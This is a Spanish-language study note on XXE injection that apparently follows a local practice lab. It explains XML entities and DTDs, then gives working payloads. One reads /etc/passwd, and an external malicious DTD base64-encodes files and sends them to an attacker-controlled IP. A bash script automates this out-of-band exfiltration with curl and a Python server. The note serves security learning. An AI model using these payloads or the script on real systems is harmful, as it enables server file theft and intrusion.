------
- Tags: #vulnerabilidades #web 
-----
# Definición XML

> Las siglas **XML** vienen de "**Extensible Markup Language**", es un lenguaje de marcado diseñado para **almacenar y transportar datos** siguiendo una estructura de árbol (Tree-Like) y lo más común es ver etiquetas y datos que es lo que mas se transporta en la mayoría de casos.

## Entidades y DTD

> Las **Entidades** en XML son elementos que **permiten representar caracteres especiales o datos de manera controlada y legible** dentro de los documentos XML, mejorando la precisión y la interoperabilidad del contenido.

> Los **DTD (Document Type Definition)** Es un conjunto de reglas que define la estructura y el tipo de datos permitidos en un documento XML, especificando los elementos, atributos y la organización jerárquica que el documento debe seguir para ser considerado válido según ese esquema. (**Se define al comienzo del archivo XML**)

Hay variedad de entidades en XML, pero a continuación mostraremos un cuadro que defina **las tres más comunes**.

| Tipo de Entidad                    | Descripción                                                                                                                                                                                                                                                                                                                                                                                                       |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Entidades Genéricas / Customizadas | Son entidades definidas internamente en el documento XML. Se declaran usando `<!ENTITY ...>` dentro del documento o en el DTD (Document Type Definition). Permiten definir fragmentos de texto o datos que pueden ser referenciados múltiples veces dentro del mismo documento. Ejemplo: `<!ENTITY nombre "valor">`.                                                                                              |
| Entidades Externas (XXE)           | Son entidades que se definen fuera del documento XML actual y se referencian dentro de él. Permiten incluir contenido de otros archivos externos dentro del documento XML. Se declaran en el DTD y se utilizan para modularizar y reutilizar datos en múltiples documentos XML. ``<!DOCTYPE``                                                                                                                     |
| Entidades Predefinidas             | Son entidades de caracteres especiales que están **predefinidas en XML** y pueden ser utilizadas en **cualquier documento XML** sin necesidad de declararlas nuevamente. Incluyen representaciones para caracteres como `<` (`&lt;`), `>` (`&gt;`), `&` (`&amp;`), `"` (`&quot;`), y `'` (`&apos;`). Estas entidades aseguran que estos caracteres especiales sean interpretados correctamente por el parser XML. |
|                                    |                                                                                                                                                                                                                                                                                                                                                                                                                   |
En la siguiente imagen donde se define el DTD, en este caso se llama "foo", este nombre lo podemos cambiar si queremos, al igual que el nombre de la entidad "xxe"

![[XXE 3.png]]

# Definición XXE

> Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es **cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe**. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection **no siempre resultan en la exposición directa de información sensible** en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales como la **XXE OOB (Out of band)**.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

# Laboratorio (XXE)

Ver la resolución de esta máquina: https://www.youtube.com/watch?v=QRgig7825Qg

Utilizaremos el siguiente laboratorio para practicar la vulnerabilidad **XML External Entity Injection (XXE)** [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

# Explotación

## XXE VISIBLE

Una forma de detectar cuando una web es vulnerable a XXE es **interceptando el tráfico con Burpsuite** a la hora de enviar una petición al servidor, para de esta manera observar en que estructura es enviada. Si llegáramos a notar que la petición es enviada en una estructura XML, eso significa que la web nos devolverá una estructura igual, gracias a esto podríamos comenzar a testear si esta es vulnerable.

![[XXE 1.png]]

-------

Al **interceptar** la petición de este formulario que nos brinda el laboratorio con **Burpsuite**, podremos notar lo siguiente

![[XXE 2.png]]

El valor que identificamos que nos devuelve la respuesta **es el campo de EMAIL**, por lo tanto ese **es el campo que debemos explotar**.

-------

En la petición anterior definimos un DTD ``<!DOCTYPE foo [<!ENTITY myName "c4sp">]>`` debajo de la declaración XML de arriba del todo.
En este caso estamos definiendo un DTD DOCTYPE llamado "foo" y luego una entidad llamada "myname" que va a valer "c4sp"

- **`<!DOCTYPE foo [...]>`**:
    
    - Esta línea define el tipo de documento como `foo` (Cualquier nombre que queramos).
    - Lo que sigue dentro de los corchetes `[...]` es la definición del DTD para este tipo de documento.
- **`<!ENTITY myname "c4sp">`**:
    
    - `<!ENTITY>` se utiliza para definir una entidad en XML. En este caso, estás definiendo una entidad llamada `myName`.
    - `"c4sp"` es el valor asignado a esta entidad. En este contexto, `"c4sp"` es una cadena de texto que representa el valor de la entidad `myName`.

Hecho esto, si ahora reemplazamos en el campo **email** con la siguiente sintaxis ``&myname;`` a la hora de enviar la petición nuevamente, la respuesta ahora nos dirá *"Sorry, c4sp is already registered!"*

![[XXE 4.png]]

-----

Lo que debemos saber es que esto que hicimos recién **podemos utilizarlo pero para listar directorios del servidor web** (En este caso nuestro contenedor) únicamente modificando un poco el código, tal que así 

 - ``<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>`` si queremos modificamos el nombre "**myFile**" y luego agregamos **SYSTEM**, utilizamos el "Wrapper" **file://** para listar el contenido del **/etc/passwd**

Al enviar esta petición el servidor web nos devolvería el contenido del **/etc/passwd**

![[XXE 5.png]]

Hay veces en las que a la hora de efectuar el XXE, **la respuesta no nos devuelva el contenido que hemos solicitado** o no encontramos un lugar donde ver una respuesta sobre lo que pedimos como nos pasó en el campo "email" en este caso, por lo tanto ahí entran en juego las **XXE OOB**

----
## XXE OOB (OUT OF BAND) INTERACTION

- **Out of Band (OOB) Interaction:**
    
    - OOB se refiere a la capacidad de la aplicación vulnerable para **realizar comunicaciones con sistemas externos controlados por el atacante**.
    - En el contexto de una XXE OOB, el atacante puede diseñar una entidad externa que, al ser procesada por la aplicación vulnerable, **genere una conexión (como una solicitud HTTP) hacia un servidor controlado por el atacante** para enviar datos sensibles.
- **Funcionamiento del Ataque:**
    
    - El atacante crea un documento XML malicioso que **incluye una entidad externa** que apunta a **una URL controlada por ellos**.
    - Cuando la aplicación vulnerable procesa este XML, intenta resolver la entidad externa **haciendo una solicitud a la URL** especificada.
    - El atacante monitorea las solicitudes entrantes en su servidor para **recolectar información sensible enviada por la aplicación vulnerable**.

-------

Algo a tener en cuenta es que hay veces que **la petición XML NO TE PERMITE DECLARAR ENTIDADES dentro de la estructura** como lo habíamos hecho antes reemplazando en el campo **"email"** con **"&myFile;"**, nos daríamos cuenta porque nos brindaría un error con respecto a las entidades, en ese caso podemos hacerlo dentro del propio **DTD !DOCTYPE**.

En la siguiente imagen se muestra el código que debemos enviar como solicitud XML al servidor con Burpsuite, este código busca un archivo llamado "**malicious.dtd**" en la ip otorgada (En este caso la nuestra), este archivo es un **DTD externo creado por nosotros ubicado en nuestra máquina de atacante**, luego desde nuestra máquina estando con un servidor montado con ``python3 -m http.server 80`` haremos de puente para que la petición pase por nosotros y llegue al archivo que se encuentra en el directorio actual.
==Recordemos que a la hora de abrir un servidor temporal con python, el servidor tendrá el contenido del directorio donde abrimos el servidor mismo==.

==En donde pone "xxe" podemos poner "myFile" como lo hicimos después de la siguiente imagen en Burpsuite, o el nombre que queramos, al igual que en donde dice "foo", nosotros pusimos "prueba", por eso da lo mismo.==
![[XXE 6.png]]

-----

El contenido del archivo **malicious.dtd** que será ejecutado una vez la petición XML lo interprete será el siguiente. 

Este archivo en ==la primera linea== lo que hace es definir una entidad llamada "file" para luego utilizar un "**Wrapper**" ``php://filter/convert.base64-encode/resource=/etc/passwd`` para convertir la respuesta que le solicitamos en este caso el contenido del **/etc/passwd** a **base64**.

Luego en ==la segunda linea== definimos una entidad llamada "**eval**" con una entidad dentro de esta, cabe aclarar que a la hora de definir una entidad dentro de otra, en la entidad interna debemos colocar el primer ``%`` en *Hexadecimal* y con ``;`` al final, tal que así ``&#x25;``, de lo contrario **nos daría un error**. Esta segunda entidad se llamará "**exfil**", luego le indicaremos a quien deseamos tramitar la petición (**A nosotros**) para hacer que nos envié esa cadena codificada por el método "**GET**" a **nuestro servidor web** montado con Python. Al final de nuestra IP, colocamos /?file= para que se nos sea mas fácil de ver la respuesta en base64, y luego llamamos a la entidad ``%file;`` definida en la primera linea para que ahí se imprima todo el contenido del **/etc/passwd** en base64.

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.193/?file=%file;'>">
%eval;
%exfil;
```

-------

![[XXE 7.png]]

Luego de enviar esta petición, y que nuestro archivo "**malicious.dtd**" sea interpretado, **nos llegará todo el contenido del /etc/passwd en base64 a nuestro servidor web** montado con Python.

![[XXE 8.png]]

Esto está genial pero el único inconveniente es que **sería demasiado tedioso tener que ir decodificando base64 en cada ruta** que estemos inspeccionando, ya sea porque estamos buscando alguna información especifica o algo que nos interese, claramente se puede hacer de manera manual, pero **podríamos crear un script para automatizar todo el proceso de decodificación**.

```bash
#!/bin/bash

echo -en "[*] Indique la ruta absoluta del archivo que quiere leer: " && read -r myFilename

malicious="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.193:222/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicious > malicious.dtd

python3 -m http.server 222 &>response &

PID=$!

sleep 1

# SI SE QUIERE USAR ESTE SCRIPT PARA OTRA WEB, SOLO HAY QUE REEMPLAZAR EL SIGUIENTE CURL, POR LOS DATOS PROPORCIONADOS POR LA WEB NUEVA

# PETICIÓN POR POST CON TODO EL CONTENIDO XML EN FORMATO RAW, COPIADO DESDE BURPSUITE
curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.0.193:222/malicious.dtd"> %xxe;]>
<root>
<name>test</name><tel>123546789</tel><email>test@test.com</email><password>test1234</password></root>' &>/dev/null

echo -e "\n\n[+] El contenido del archivo es:\n "

file= cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response
rm malicious.dtd
```